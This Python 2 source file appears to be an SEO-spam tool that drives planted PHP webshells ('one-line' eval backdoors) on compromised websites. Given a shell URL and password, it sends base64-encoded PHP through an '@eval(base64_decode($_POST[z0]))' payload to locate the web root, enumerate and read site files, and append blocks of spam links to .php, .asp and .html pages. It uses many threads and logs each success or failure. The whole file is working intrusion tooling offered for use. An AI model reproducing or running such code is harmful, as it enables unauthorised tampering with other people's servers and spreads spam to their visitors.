#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
#BY: QQ292925842
import threading
import httplib
import re
import php_data
import g
import sys
import base64
import eval
import list
import httplib,StringIO,gzip,urllib,re
import binascii
import chardet
import ConfigParser  #读取INI配置信息
import random
import time
import Queue
import thread

sys.path.append('..')
reload(sys)
sys.setdefaultencoding("utf-8")

class shell_links(threading.Thread):
    def __init__(self, url, password,i,path_data,url_lis):
        threading.Thread.__init__(self)
        self.url = url  #URL
        self.password = password  #password
        self.TH=i  #线程号
        self.path_data = path_data    #生成路径
        self.url_lis = url_lis      #内链数据
        self.DEBUG = True #调试
        #self.list_2 = []
        self.link=[]   #链接
        self.key=[]   #关键字
        self.nl_link_int=1 #内链多少条
        self.wl_link_int=1 #外链多少条
        self.thread_link=1 #子线程数
        self.htm_html_text="$data_link"  #挂链接模板
        #self.zml= 1 #是否可以修改主目录 1可以  0不可以
        self.web_path = "" #网站根目录
        self.win_Linux = ""  #操作系统
        self.file_name_fa =2  #;设置要修改的方法
        self.path_nmae1 = ""
        self.path_nmae2 =""  #要查找的文件名
        #self.tag_text = []  #></script>
        self.path_Queue = Queue.Queue(0)  #存放文件路径
        self.open_pb_txt()   #读取要屏蔽的内容
        self.open_mai_ini()   #读取配置信息

    def open_mai_ini(self):   #读取配置信息
        # 读取INI配置信息
        try:
            config = ConfigParser.ConfigParser()
            config.readfp(open("main.ini"))
            self.file_name_fa = int(config.get("shell_seo", "file_name_fa"))  #;设置要修改的方法
            self.path_nmae1 = str(config.get("shell_seo", "file_name1"))  #;指定目录修改文件名
            self.path_nmae2 = str(config.get("shell_seo", "file_name2"))  #;遍历要修改文件名
            self.thread_link = int(config.get("shell_seo", "thread_link"))  #;子线程数
            self.nl_link_int = int(config.get("shell_seo", "nl_link_int"))  #;内链多少条
            self.wl_link_int = int(config.get("shell_seo", "wl_link_int"))  #;外链多少条
        except:
            pass

    def open_pb_txt(self):   #读取要屏蔽的内容
        try:
            try:
                xxx = file("data/links.txt", 'r')  #链接
                for xxx_line in xxx.readlines():
                    self.link.append(xxx_line.strip().lstrip())  #添加数据+"\r\n"

                random.shuffle(self.link)   #打算数组原有排序方式
            except Exception, e:
                print u"读取文件 data/links.txt 异常"
                pass
            try:
                xxx = file("data/key.txt", 'r')  #链接
                for xxx_line in xxx.readlines():
                    self.key.append(xxx_line.strip().lstrip())  #添加数据+"\r\n"

                random.shuffle(self.key)   #打算数组原有排序方式
            except Exception, e:
                print u"读取文件 data/key.txt 异常"
                pass
            try:
                file_object = open('data/htm_html.txt')  #挂链模板
                try:
                    self.htm_html_text = file_object.read()
                finally:
                    file_object.close()
            except Exception, e:
                print u"读取文件 data/htm_html.txt 异常"
                pass
        except Exception, e:
            print e
            return 0

    def re_data(self, data, re_dtaa):  #正则匹配  r'<meta name="generator" content="(.*?)" />'
        try:
            p = re.compile(re_dtaa)
            sarr = p.findall(data)
            if len(sarr)>=1:
                if not sarr[0]=="":
                    return 1
            else:
                return 0
        except:
            return 0

    def open_txt(self,name):
        try:
            data = ""
            xxx = file(name, 'r')
            for xxx_line in xxx.readlines():
                data+=xxx_line.strip().lstrip()+"\r\n"
            return data
        except Exception,e:
            print u"读取本地文件 %s 失败"%(name)
            return 0

    def TXT_file_add(self,file_nem,data):  #写入文本
        try:
            #file_nem=time.strftime('%Y.%m.%d')   #file_nem+".txt"
            file_object = open(file_nem,'a')
            #file_object.write(list_passwed[E])
            file_object.writelines(data)
            file_object.writelines("\n")
            file_object.close()
        except Exception,e:
            print u"写入TXT失败",file_nem,data,e
            return 0

    def add_DEBUG(self,data):
        data = "%s|%s|%s"%(self.url,self.password,data)
        print u"%s  编码转换错误"%(data)
        self.TXT_file_add("log/DEBUG.txt",data)

    def sjs_random(self,zd0,zd1):  #获取随机数
        try:
            return random.randint(zd0, zd1)
        except Exception, e:
        #print e
            return 1

    def run(self):
        try:
            self.web_path = self.www_web_path()  #获取网站根目录
            self.win_Linux = eval.yijuhua_win_linux(self.url, self.password) #URL地址 ，密码   返回操作系统
            if self.file_name_fa==1:
                self.open_php_fie_name1(str(self.path_nmae1))   #指定目录修改文件名
                return 0
            if self.file_name_fa==2:
                self.open_php_fie_name2(str(self.path_nmae2))   #读取要遍历的文件
                return 0
            self.zml= 0 #是否可以修改主目录 1可以  0不可以
            self.open_php_fie_name2(str(self.path_nmae2))   #读取要遍历的文件
            return 0

        except Exception, e:
            #print e
            return 0

    def open_php_fie_name1(self,path_data):   #指定目录修改文件名
        try:
            #print path_data
            ss = path_data.split("|")
            self.id1=0
            id2=len(ss)
            for i2 in ss:
                if len(i2) <= 1:
                    continue  #跳过   这一次
                i2="%s%s"%(self.web_path,str(i2))
                #print "%s"%(i2)
                self.id1+=1
                self.run_file_thread(i2,self.id1,id2)
        except Exception, e:
            #print e
            return 0

    def open_php_fie_name2(self,path_data):   #遍历要修改文件名
        try:
            PHP_data = str(php_data.PHP_bl_path)  #获取遍历文件   .decode('utf-8').encode('gbk')
            PHP_data = g.QC_PHP(PHP_data)  #清除PHP中没有用的数据
            #path_data = "index.php|forum.php|conn.php|CONN.php|home.php|common.inc.php|global.php"  #路径
            #path_data = "conn2.php|conn.php"  #路径
            data_base64="%s"%(base64.b64encode(PHP_data))
            params = "=@eval(base64_decode($_POST[z0]));&z0=%s&z1=%s" % (urllib.quote(data_base64),base64.b64encode(path_data))  #quote URL编码
            data = eval.post_eval_data(self.url, self.password, params)
            data = g.re_data(data) #正则返回的结果
            if not data:
                print u"php_ok_null.txt没有读取到数据 is 0 null...."
                websehll="%s|%s"%(self.url,self.password)
                self.TXT_file_add("php_ok_null.txt",str(websehll))
                return False
            ss = data.split("$")
            self.id1=0
            id2=len(ss)

            for i2 in ss:
                if len(i2) <= 1:
                    continue  #跳过   这一次
                self.path_Queue.put(i2,0.3)   #插入队列
            while not self.path_Queue.empty():   #判断队列是否为空
                try:
                    threads = []  #线程
                    for i in range(self.thread_link):  #nthreads=10  创建10个线程
                        self.id1+=1
                        threads.append(self.time_sleep(i+1,id2))
                    for t in threads:
                        t.start()  #开始线程
                    for t in threads:
                        t.join()  #等待线程，保持主进程
                except Exception,e:
                    #print "1111111111",e
                    pass
            return 0
        except Exception,e:
            #print "1111111111",e
            return 0

    def time_sleep(self,i,id2):
        try:
            if self.path_Queue.empty():   #判断队列是否为空
                #print u"thread:%d 数据完成"%(self.TH)
                #time.sleep(60)
                return 0
            else:
                URL = self.path_Queue.get(0.5)  #get()方法从队头删除并返回一个项目
                self.run_file_thread(URL,i,id2)
                return 0
        except Exception,e:
            #print "2222222222222",e
            return 0

    def run_file_thread(self,i,i2,id2):
        try:
            B_M=g.asp_aspx_php_htm_html(str(i))  #查看文件格式
            #asp aspx php htm html null
            url = g.ww_path(g.get_domain(self.url, 1), self.web_path, str(i))
            id="[%d-%d]thread_link:%d "%(id2,self.id1,i2)
            if B_M=="null":
                print u"%s----不在支持类型中 支持.asp .aspx .php .htm .html"%(str(url))
                return 0
                #continue  #跳过   这一次

#            str_data="thread:%d %s%s"%(self.TH,id,str(url))
#            print i
#            print str_data
            if (B_M=="htm")or(B_M=="html")or(B_M=="php")or(B_M=="aspx")or(B_M=="asp"):
                str_data="thread:%d %s%s"%(self.TH,id,str(url))
                if self.bj_file_php(str(i)):
                    str_data="%s--add  file  kink  ok"%(str_data)
                    self.TXT_file_add("log/add_file_ok.txt",str(url))
                    print str_data
                else:
                    str_data="%s--add  file  kink  no"%(str_data)
                    self.TXT_file_add("log/add_file_no.txt",str(url))
                    print str_data
        except Exception,e:
            #print "2222222222222",e
            return 0

    def bj_file_php(self,path_name):  #编辑PHP
        try:
            php_text = ""   #读取要挂载的文件内容
            for i in range(10):
                php_text = self.html_htm_data()  #自合链接内容
                if len(php_text)>=10:
                    break #跳出   整个循环
            if len(php_text)<=10:
                    return 0
            data = self.open_file(str(path_name))  #"D:/wamp/www/conn.php"
            if len(data)<=10:
                return 0
            utf_gbk, data = g.utf_8_G(data)  #解码
            #print data
            if data == u"no":
                if self.DEBUG:
                    deg_data = u"%s读取或转换失败"%(str(path_name))
                    self.add_DEBUG(deg_data)
                return 0
            data = u"%s\r\n%s"%(data,php_text)
            no_ok, data = g.utf_8_B(utf_gbk, data)   #编码
            if no_ok == "ok":
                #if self.write_file(str(path_name),data) == "1":
                if self.php_add_file(str(path_name),data,"")=="1":  #写入文件和内容
                    return 1
                else:
                    return 0
            else:
                print data
                return 0
        except Exception,e:
            #print "2222222222222",e
            return 0

    def html_htm_data(self):  #自合链接内容
        try:
        #self.nl_link_int=4	;内链多少条
        #self.wl_link_int=2  ;外链多少条
            list=[]
            a=["<li><a href=\"$url\">$key</a></li>","<A href=\"$url\" target='_blank'>$key</A>","<a href=\"$url\" target=\"_blank\">$key</a>","<li><a href=\"$url\">$key</a></li>","<A href=\"$url\" target='_blank'>$key</A>","<a href=\"$url\" target=\"_blank\">$key</a>"]
    #        print self.nl_link_int
    #        print self.wl_link_int
            #random.shuffle(a)   #打算数组原有排序方式
            url_data=a[self.sjs_random(0,len(a)-1)]
            url_data=url_data.replace('$url',self.path_data)
            url_data=url_data.replace('$key',self.key[self.sjs_random(0,len(self.key))])
            list.append(url_data)
            url_data=a[self.sjs_random(0,len(a)-1)]
            url_data=url_data.replace('$url',self.path_data+"index.html")
            url_data=url_data.replace('$key',self.key[self.sjs_random(0,len(self.key))])
            list.append(url_data)
            for i in range(self.wl_link_int):   #外链
                ss = self.link[self.sjs_random(0,len(self.link))]
                ss = ss.split("|")
                if len(ss) != 2:
                    continue  #跳过   这一次
                #random.shuffle(a)   #打算数组原有排序方式
                url_data=a[self.sjs_random(0,len(a)-1)]
                url_data=url_data.replace('$url',ss[0])
                url_data=url_data.replace('$key',ss[1])
                list.append(url_data)
            for i in range(self.nl_link_int):   #内链
                ss = self.url_lis[self.sjs_random(0,len(self.url_lis))]
                ss = ss.split("|")
                if len(ss) != 2:
                    continue  #跳过   这一次
                #random.shuffle(a)   #打算数组原有排序方式
                url_data=a[self.sjs_random(0,len(a)-1)]
                url_data=url_data.replace('$url',ss[0])
                url_data=url_data.replace('$key',ss[1])
                list.append(url_data)

            random.shuffle(list)   #打算数组原有排序方式
            url_data2=""
            for i in list:
                url_data2+=str(i)
                url_data2+="\r\n"

            return self.htm_html_text.replace('$data_link',url_data2)
        except Exception,e:
            #print e
            return ""

    def www_web_path(self):  #获取网站根目录
        try:
            PHP_data = str(php_data.php_www_path)  #获取遍历文件   .decode('utf-8').encode('gbk')
            PHP_data = g.QC_PHP(PHP_data)  #清除PHP中没有用的数据
            data_base64 = "%s" % (base64.b64encode(PHP_data))
            eval_data="%s"%(urllib.quote("@eval(base64_decode($_POST[z0]));"))
            params = "=%s&z0=%s" % (eval_data,urllib.quote(data_base64))  #quote URL编码
            data = eval.post_eval_data(self.url, self.password, params)
            data2 = g.re_data(data) #正则返回的结果
            return data2
        except Exception,e:
            #print e
            return 0

    def open_file(self, path):  #读取文件
        try:
            PHP_data = str(php_data.php_open_file)  #获取遍历文件   .decode('utf-8').encode('gbk')
            PHP_data = g.QC_PHP(PHP_data)  #清除PHP中没有用的数据
            data_base64="%s"%(base64.b64encode(PHP_data))
            params = "=@eval(base64_decode($_POST[z0]));&z0=%s&z1=%s" % (urllib.quote(data_base64), path)  #quote URL编码
            data = eval.post_eval_data(self.url, self.password, params)
            data2=g.re_data(data) #正则返回的结果
            return data2
        except Exception,e:
            #print e
            return 0

    def str_to_ascii(self, data):
        str_data = ""
        for i, ch in enumerate(data):
            str_data += "%"+binascii.b2a_hex(ch)
        return str_data

#    def write_file(self, path, data):  #写入文件
#        try:
#            PHP_data = str(php_data.write_file)  #获取遍历文件   .decode('utf-8').encode('gbk')
#            PHP_data = g.QC_PHP(PHP_data)  #清除PHP中没有用的数据
#            data = self.str_to_ascii(data)
#            #print urllib.unquote(data)
#            data = data.replace('%','')#.replace(',','')   #替换字符串
#
#            #print data
#            data_base64="%s"%(base64.b64encode(PHP_data))
#            params = "=@eval(base64_decode($_POST[z0]));&z0=%s&z1=%s&z2=%s" % (urllib.quote(data_base64), base64.b64encode(path), data)  #quote URL编码
#            #print params
#            data = eval.post_eval_data(self.url, self.password, params)
#            data2 = g.re_data(data) #正则返回的结果
#            return data2
#        except Exception, e:
#            print e
#            return 0

    def php_add_file(self,path,data,path2):  #写入文件和内容
        try:
            PHP_data = str(php_data.php_add_file)
            PHP_data = g.QC_PHP(PHP_data)  #清除PHP中没有用的数据
            #print PHP_data
            data_base64 = "%s" % (base64.b64encode(PHP_data))
            eval_data="%s"%(urllib.quote("@eval(base64_decode($_POST[z0]));"))

            params = "=%s&z0=%s&z1=%s&z2=%s&z3=%s" % (eval_data,urllib.quote(data_base64),base64.b64encode(path),urllib.quote(base64.b64encode(data)),base64.b64encode(path2))  #quote URL编码
            data = eval.post_eval_data(self.url, self.password, params)
            data2 = g.re_data(data) #正则返回的结果
            return data2
        except Exception,e:
            #print e
            return 0
    ##########################################################################
#import chardet
if __name__=='__main__':
    threads = []  #线程
    path_data="/data/"
    url_lis=["http://www.baidu.com/111|11111","http://www.baidu.com/222|22222","http://www.baidu.com/333|33333","http://www.baidu.com/444|44444"]
    for i in range(1):
        threads.append(shell_links("http://localhost/long.php","long123",1,path_data,url_lis))
        #threads.append(php_ecal("http://aoglight.com/plus/mytag_js.php?aid=9090","guige",1))
    for t in threads:
        t.start()

